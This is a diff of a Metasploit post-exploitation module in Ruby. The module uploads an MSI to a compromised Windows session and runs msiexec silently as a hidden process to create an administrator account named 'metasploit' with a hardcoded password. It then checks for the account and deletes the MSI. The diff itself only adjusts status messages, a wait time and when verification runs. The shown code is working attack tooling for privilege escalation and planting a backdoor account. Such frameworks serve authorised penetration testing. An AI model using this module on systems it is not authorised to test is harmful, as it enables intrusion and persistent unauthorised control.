@@ -29,8 +29,8 @@ class Metasploit3 < Msf::Post
 				an administrator with the password 'P@55w0rd12345'.
 
 				The user can specify their own MSI file (perhaps an MSF payload exe
-				wrapped in an MSI file). The default MSI file can be found under
-				data/post/ with the WiX source file under data/post/create_admin_source/.
+				wrapped in an MSI file). The default MSI file is data/post/create_admin.msi 
+				with the WiX source file under data/post/create_admin_source/.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>
@@ -90,6 +90,7 @@ class Metasploit3 < Msf::Post
 				msi_source = ::File.join(Msf::Config.install_root, "data", "post", "create_admin.msi")
 			else
 				msi_source = datastore['MSI_FILE']
+				print_status("Using custom MSI: #{msi_source}")
 			end
 
 			# Upload MSI
@@ -102,20 +103,21 @@ class Metasploit3 < Msf::Post
 			cmd = "msiexec.exe /quiet /passive /n /package #{msi_destination}"
 			session.sys.process.execute(cmd, nil, {'Hidden' => true})
 
-			select(nil, nil, nil, 3)
+			select(nil, nil, nil, 5)
 
 			# Verify
-			print_status("Verifying user created...")
-			begin
-				print_line client.shell_command_token("net user metasploit", 5)
-			rescue Exception => e
-				print_error(e)
+			if datastore['MSI_FILE'].nil?
+				print_status("Verifying user created...")
+				begin
+					print_line client.shell_command_token("net user metasploit", 5)
+				rescue Exception => e
+					print_error(e)
+				end
 			end
 
 			# Cleanup
 			print_status("Deleting MSI...")
 			session.fs.file.delete(msi_destination)
-
 		end
 	end
 end
